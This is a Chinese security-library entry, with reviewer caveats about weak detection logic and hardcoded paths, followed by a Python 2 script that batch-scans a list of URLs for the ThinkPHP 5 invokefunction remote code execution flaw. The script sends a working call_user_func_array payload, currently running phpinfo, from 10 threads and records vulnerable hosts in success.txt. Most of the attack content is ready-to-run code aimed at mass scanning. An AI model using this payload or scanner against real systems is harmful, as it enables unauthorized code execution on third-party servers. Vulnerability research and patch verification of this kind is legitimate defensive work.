---
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkPHP / 控制器反射检测"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp5命令执行批量验证脚本"
prerequisites: "来源所述条件，未列明部分仍待核：无版本；Python2、固定/public/index.php、固定App类入口"
side_effects: "未执行；本文需注意的操作影响：并发结果写入需稳健；多个线程同时append，错误只打印connect failed，不区分网络/不支持/结果未知"
source_status: "unknown"
id: "vw-4c4c232488d0a285c48e5a24"
entity_id: "ve-4c4c232488d0a285c48e5a24"
schema_version: "1"
canonical: "Web安全/开发框架/ThinkPHP/Thinkphp5命令执行批量验证脚本.md"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无版本；Python2、固定/public/index.php、固定App类入口

代码与实验材料：完整10线程脚本，只搜索PHP Extension，无控制请求或版本判断；未运行

来源证据范围：白阁来源，无作者/上游commit

- **证据待核（1）**：检测结论过强；依据：正常phpinfo页面或重定向可包含同标记，缺阴性对照；一个入口失败不能判全部ThinkPHP无漏洞。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **实验改动边界（2）**：路径和运行条件写死；依据：强制拼/public/index.php，现有路径或public根会重复；Python2已旧且无明确依赖版本。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **结论使用边界（3）**：并发结果写入需稳健；依据：多个线程同时append，错误只打印connect failed，不区分网络/不支持/结果未知。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

### thinkphp5命令执行  

### POC检测代码   

```python
# -*- coding:UTF-8 -*-
# evn :python2

import requests
import threading
import time
import sys

class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
    def __init__(self, url, sem):
        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem

    def run(self):
        parameters = "s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

        try:
            responce = requests.get(url = self.url, params = parameters,timeout=3)
            body = responce.text
            if body.find('PHP Extension') != -1:
                with open("success.txt", "a+") as f1:
                    f1.write("存在tp5远程代码执行漏洞: " + self.url + "\n")
                    print("[+] " + self.url)
            else:
                print("[-] " + self.url)
        except Exception,err:
            print("connect failed")
            pass
        self.sem.release()             #执行完函数，释放线程，线程数加1

class host(threading.Thread):          #遍历文件操作
    def __init__(self, sem):
        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
        self.sem = sem

    def run(self):
        with open("url.txt", "r") as f:
            for host in f.readlines():
                self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
                host = host.strip()+"/public/index.php"
                host_thread = check(host, self.sem)  
                host_thread.start()    #执行check()的执行函数

if __name__ == '__main__':
    sem = threading.Semaphore(10)      #最大线程数为10个
    thread = host(sem)                 #传递sem值
    thread.start()
```

------
使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。


---

> 来源：白阁文库 BaizeSec/bylibrary
